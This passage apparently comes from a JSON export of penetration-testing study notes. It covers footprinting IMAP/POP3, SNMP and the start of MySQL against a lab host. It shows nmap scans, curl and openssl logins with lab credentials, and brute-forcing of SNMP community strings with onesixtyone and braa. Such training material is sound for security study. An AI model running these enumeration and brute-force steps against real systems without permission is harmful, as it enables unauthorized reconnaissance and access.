capabilities.|\n|`RSET`|Requests the server to reset the transmitted information.|\n|`QUIT`|Closes the connection with the POP3 server.|\n\n---\n\n## Dangerous Settings\n\nNevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:\n\n|**Setting**|**Description**|\n|---|---|\n|`auth_debug`|Enables all authentication debug logging.|\n|`auth_debug_passwords`|This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.|\n|`auth_verbose`|Logs unsuccessful authentication attempts and their reasons.|\n|`auth_verbose_passwords`|Passwords used for authentication are logged and can also be truncated.|\n|`auth_anonymous_username`|This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.|\n\n---\n\n## Footprinting the Service\n\nBy default, ports `110` and `995` are used for POP3, and ports `143` and `993` are used for IMAP. The higher ports (`993` and `995`) use TLS/SSL to encrypt the communication between the client and server. Using Nmap, we can scan the server for these ports. The scan will return the corresponding information (as seen below) if the server uses an embedded certificate.\n\n#### Nmap\n\nIMAP / POP3\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00026s latency).\n\nPORT    STATE SERVICE  VERSION\n110/tcp open  pop3     Dovecot pop3d\n|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING\n| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n143/tcp open  imap     Dovecot imapd\n|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1\n| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n993/tcp open  ssl/imap Dovecot imapd\n|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1\n| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n995/tcp open  ssl/pop3 Dovecot pop3d\n|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING\n| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.74 seconds\n```\n\nFor example, from the output, we can see that the common name is `mail1.inlanefreight.htb`, and the email server belongs to the organization `Inlanefreight`, which is located in California. The displayed capabilities show us the commands available on the server and for the service on the corresponding port.\n\nIf we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages.\n\n#### cURL\n\nIMAP / POP3\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd\n\n* LIST (\\HasNoChildren) \".\" Important\n* LIST (\\HasNoChildren) \".\" INBOX\n```\n\nIf we also use the `verbose` (`-v`) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server.\n\nIMAP / POP3\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v\n\n*   Trying 10.129.14.128:993...\n* TCP_NODELAY set\n* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)\n* successfully set certificate verify locations:\n*   CAfile: /etc/ssl/certs/ca-certificates.crt\n  CApath: /etc/ssl/certs\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384\n* Server certificate:\n*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb\n*  start date: Sep 19 19:44:58 2021 GMT\n*  expire date: Jul  4 19:44:58 2295 GMT\n*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb\n*  SSL certificate verify result: self signed certificate (18), continuing anyway.\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* old SSL session ID is stale, removing\n< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4\n> A001 CAPABILITY\n< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN\n< A001 OK Pre-login capabilities listed, post-login capabilities have more.\n> A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=\n< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE\n< A002 OK Logged in\n> A003 LIST \"\" *\n< * LIST (\\HasNoChildren) \".\" Important\n* LIST (\\HasNoChildren) \".\" Important\n< * LIST (\\HasNoChildren) \".\" INBOX\n* LIST (\\HasNoChildren) \".\" INBOX\n< A003 OK List completed (0.001 + 0.000 secs).\n* Connection #0 to host 10.129.14.128 left intact\n```\n\nTo interact with the IMAP or POP3 server over SSL, we can use `openssl`, as well as `ncat`. The commands for this would look like this:\n\n#### OpenSSL - TLS Encrypted Interaction POP3\n\nIMAP / POP3\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s\n\nCONNECTED(00000003)\nCan't use SSL_get_servername\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\nverify return:1\n---\nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\n\n...SNIP...\n\n---\nread R BLOCK\n---\nPost-Handshake New Session Ticket arrived:\nSSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n    Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2\n    Session-ID-ctx:\n    Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4   ...~...5.@....A.\n    0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94   .l..OP.r6%..r.#.\n    0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad   .)..X.W...k..1[.\n    0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d   G..gX.....V.z..m\n    0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89   C..h...GO.H.@E..\n    0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e   ..5.m<.F\\.e....^\n    0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38   ..%.C.qp@l.o...8\n    0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8   n.s......>.*....\n    0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24   ..P...f.|...J..$\n    0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5   .....+..dD[.k...\n    00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3   ......z}......n.\n    00b0 - 0a d6 50 5d fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e   ..P]...\\(..6.}*.\n\n    Start Time: 1632081313\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: no\n    Max Early Data: 0\n---\nread R BLOCK\n+OK HTB-Academy POP3 Server\n```\n\n#### OpenSSL - TLS Encrypted Interaction IMAP\n\nIMAP / POP3\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl s_client -connect 10.129.14.128:imaps\n\nCONNECTED(00000003)\nCan't use SSL_get_servername\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\nverify return:1\n---\nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\n\n...SNIP...\n\n---\nread R BLOCK\n---\nPost-Handshake New Session Ticket arrived:\nSSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n    Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699\n    Session-ID-ctx:\n    Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24   h;.h...|......r$\n    0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d   b....$...E`&..J}\n    0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d   .n.....A..I..6@.\n    0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29   .5........?.R..)\n    0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb   ....F..2H...F6..\n    0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0   5yTLW..U..Y.^d..\n    0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01   .....G.Y...T....\n    0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12   V...;..t..f.l(..\n    0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec   4.ck.q...i.8zGF.\n    0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21   g....1X.OW0j..:!\n    00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d   T....t........T}\n    00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62   F.3.]$.. cC...Mb\n\n    Start Time: 1632081604\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: no\n    Max Early Data: 0\n---\nread R BLOCK\n* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4\n```\n\nOnce we have successfully initiated a connection and logged in to the target mail server, we can use the above commands to work with and navigate the server. We want to point out that the configuration of our own mail server, the research for it, and the experiments we can do together with other community members will give us the know-how to understand the communication taking place and what configuration options are responsible for this.\n\nIn the SMTP section, we have found the user `robin`. Another member of our team was able to find out that the user also uses his username as a password (`robin`:`robin`). We can use these credentials and try them to interact with the IMAP/POP3 services.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/13-SNMP",
    "path": "02_CPTS/03-Footprinting/13-SNMP.md",
    "title": "13 SNMP",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Simple Network Management Protocol (SNMP) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled h...",
    "category": "02_CPTS",
    "content": "`Simple Network Management Protocol` ([SNMP](https://datatracker.ietf.org/doc/html/rfc1157)) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is `SNMPv3`, which increases the security of SNMP in particular, but also the complexity of using this protocol.\n\nIn addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port `161`. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called `traps` over UDP port `162`. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.\n\nFor the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.\n\n#### MIB\n\nTo ensure that SNMP access works across manufacturers and with different client-server combinations, the `Management Information Base` (`MIB`) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one `Object Identifier` (`OID`), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the `Abstract Syntax Notation One` (`ASN.1`) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.\n\n#### OID\n\nAn OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the [Object Identifier Registry](https://www.alvestrand.no/objectid/).\n\n#### SNMPv1\n\nSNMP version 1 (`SNMPv1`) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has `no built-in authentication` mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it `does not support encryption`, meaning that all data is sent in plain text and can be easily intercepted.\n\n#### SNMPv2\n\nSNMPv2 existed in different versions. The version still exists today is `v2c`, and the extension `c` means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the `community string` that provides security is only transmitted in plain text, meaning it has no built-in encryption.\n\n#### SNMPv3\n\nThe security has been increased enormously for `SNMPv3` by security features such as `authentication` using username and password and transmission `encryption` (via `pre-shared key`) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than `v2c`.\n\n#### Community Strings\n\nCommunity strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using `SNMPv2`, as the transition to `SNMPv3` can be very complex, but the services still need to remain active. This causes many administrators a great deal of concern and creates some problems they are keen to avoid. The lack of knowledge about how the information can be obtained and how we as attackers use it makes the administrators' approach seem inexplicable. At the same time, the lack of encryption of the data sent is also a problem. Because every time the community strings are sent over the network, they can be intercepted and read.\n\n---\n\n## Default Configuration\n\nThe default configuration of the SNMP daemon defines the basic settings for the service, which include the IP addresses, ports, MIB, OIDs, authentication, and community strings.\n\n#### SNMP Daemon Config\n\nSNMP\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v \"#\" | sed -r '/^\\s*$/d'\n\nsysLocation    Sitting on the Dock of the Bay\nsysContact     Me <me@example.org>\nsysServices    72\nmaster  agentx\nagentaddress  127.0.0.1,[::1]\nview   systemonly  included   .1.3.6.1.2.1.1\nview   systemonly  included   .1.3.6.1.2.1.25.1\nrocommunity  public default -V systemonly\nrocommunity6 public default -V systemonly\nrouser authPrivUser authpriv -V systemonly\n```\n\nThe configuration of this service can also be changed in many ways. Therefore, we recommend setting up a VM to install and configure the SNMP server ourselves. All the settings that can be made for the SNMP daemon are defined and described in the [manpage](http://www.net-snmp.org/docs/man/snmpd.conf.html).\n\n---\n\n## Dangerous Settings\n\nSome dangerous settings that the administrator can make with SNMP are:\n\n|**Settings**|**Description**|\n|---|---|\n|`rwuser noauth`|Provides access to the full OID tree without authentication.|\n|`rwcommunity <community string> <IPv4 address>`|Provides access to the full OID tree regardless of where the requests were sent from.|\n|`rwcommunity6 <community string> <IPv6 address>`|Same access as with `rwcommunity` with the difference of using IPv6.|\n\n---\n\n## Footprinting the Service\n\nFor footprinting SNMP, we can use tools like `snmpwalk`, `onesixtyone`, and `braa`. `Snmpwalk` is used to query the OIDs with their information. `Onesixtyone` can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. Since these community strings can be bound to any source, identifying the existing community strings can take quite some time.\n\n#### SNMPwalk\n\nSNMP\n\n```shell-session\ndrxh3kr@htb[/htb]$ snmpwalk -v2c -c public 10.129.14.128\n\niso.3.6.1.2.1.1.1.0 = STRING: \"Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64\"\niso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10\niso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34\niso.3.6.1.2.1.1.4.0 = STRING: \"mrb3n@inlanefreight.htb\"\niso.3.6.1.2.1.1.5.0 = STRING: \"htb\"\niso.3.6.1.2.1.1.6.0 = STRING: \"Sitting on the Dock of the Bay\"\niso.3.6.1.2.1.1.7.0 = INTEGER: 72\niso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1\niso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1\niso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1\niso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1\niso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1\niso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49\niso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4\niso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50\niso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3\niso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92\niso.3.6.1.2.1.1.9.1.3.1 = STRING: \"The SNMP Management Architecture MIB.\"\niso.3.6.1.2.1.1.9.1.3.2 = STRING: \"The MIB for Message Processing and Dispatching.\"\niso.3.6.1.2.1.1.9.1.3.3 = STRING: \"The management information definitions for the SNMP User-based Security Model.\"\niso.3.6.1.2.1.1.9.1.3.4 = STRING: \"The MIB module for SNMPv2 entities\"\niso.3.6.1.2.1.1.9.1.3.5 = STRING: \"View-based Access Control Model for SNMP.\"\niso.3.6.1.2.1.1.9.1.3.6 = STRING: \"The MIB module for managing TCP implementations\"\niso.3.6.1.2.1.1.9.1.3.7 = STRING: \"The MIB module for managing IP and ICMP implementations\"\niso.3.6.1.2.1.1.9.1.3.8 = STRING: \"The MIB module for managing UDP implementations\"\niso.3.6.1.2.1.1.9.1.3.9 = STRING: \"The MIB modules for managing SNMP Notification, plus filtering.\"\niso.3.6.1.2.1.1.9.1.3.10 = STRING: \"The MIB module for logging SNMP Notifications.\"\niso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78\niso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 \niso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216\niso.3.6.1.2.1.25.1.4.0 = STRING: \"BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash\"\niso.3.6.1.2.1.25.1.5.0 = Gauge32: 3\niso.3.6.1.2.1.25.1.6.0 = Gauge32: 411\niso.3.6.1.2.1.25.1.7.0 = INTEGER: 0\niso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)\n\n...SNIP...\n\niso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: \"printer-driver-sag-gdi_0.1-7_all\"\niso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: \"printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: \"procps_2:3.3.16-1ubuntu2.3_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: \"proftpd-basic_1.3.6c-2_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: \"proftpd-doc_1.3.6c-2_all\"\niso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: \"psmisc_23.3-1_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: \"publicsuffix_20200303.0012-1_all\"\niso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: \"pulseaudio_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: \"pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: \"pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: \"python-apt-common_2.0.0ubuntu0.20.04.6_all\"\niso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: \"python3_3.8.2-0ubuntu2_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: \"python3-acme_1.1.0-1_all\"\niso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: \"python3-apport_2.20.11-0ubuntu27.21_all\"\niso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: \"python3-apt_2.0.0ubuntu0.20.04.6_amd64\" \n\n...SNIP...\n```\n\nIn the case of a misconfiguration, we would get approximately the same results from `snmpwalk` as just shown above. Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information like in the previous example.\n\nHere we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use `onesixtyone` and `SecLists` wordlists to identify these community strings.\n\n#### OneSixtyOne\n\nSNMP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt install onesixtyone\ndrxh3kr@htb[/htb]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128\n\nScanning 1 hosts, 3220 communities\n10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64\n```\n\nOften, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists. Creating custom wordlists is not an essential part of this module, but more details can be found in the module [Cracking Passwords With Hashcat](https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat).\n\nOnce we know a community string, we can use it with [braa](https://github.com/mteg/braa) to brute-force the individual OIDs and enumerate the information behind them.\n\n#### Braa\n\nSNMP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt install braa\ndrxh3kr@htb[/htb]$ braa <community string>@<IP>:.1.3.6.*   # Syntax\ndrxh3kr@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*\n\n10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64\n10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10\n10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548\n10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb\n10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb\n10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US\n10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78\n...SNIP...\n```\n\nOnce again, we would like to point out that the independent configuration of the SNMP service will bring us a great variety of different experiences that no tutorial can replace. Therefore, we highly recommend setting up a VM with SNMP, experimenting with it, and trying different configurations. SNMP can be a boon for an I.T. systems administrator as well as a curse for Security analysts and managers alike.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/14-MySQL",
    "path": "02_CPTS/03-Footprinting/14-MySQL.md",
    "title": "14 MySQL",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "MySQL is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The data...",
    "category": "02_CPTS",
    "content": "`MySQL` is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the [SQL database language](https://www.w3schools.com/sql/sql_intro.asp). MySQL works according to the `client-server principle` and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension `.sql`, for example, like `wordpress.sql`.\n\n#### MySQL Clients\n\nThe MySQL clients can retrieve and edit the data using structured queries to the database engine. Inserting, deleting, modifying, and retrieving data, is done using the SQL database language. Therefore, MySQL is suitable for managing many different databases to which clients can send multiple queries simultaneously. Depending on the use of the database, access is possible via an internal network or the public Internet.\n\nOne of the best examples of database usage is the CMS WordPress. WordPress stores all created posts, usernames, and passwords in their own database, which is only accessible from the localhost. However, as explained in more detail in the module [Introduction to Web Applications](https://academy.hackthebox.com/course/preview/introduction-to-web-applications), there are database structures that are distributed across multiple servers also.\n\n#### MySQL Databases\n\nMySQL is ideally suited for applications such as `dynamic websites`, where efficient syntax and high response speed are essential. It is often combined with a Linux OS, PHP, and an Apache web server and is also known in this combination as [LAMP](https://en.wikipedia.org/wiki/LAMP_\\(software_bundle\\)) (Linux, Apache, MySQL, PHP), or when using Nginx, as [LEMP](https://lemp.io/). In a web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored. Among these are:\n\n|||||\n|---|---|---|---|\n|Headers|Texts|Meta tags|Forms|\n|Customers|Usernames|Administrators|Moderators|\n|Email addresses|User information|Permissions|Passwords|\n|External/Internal links|Links to Files|Specific 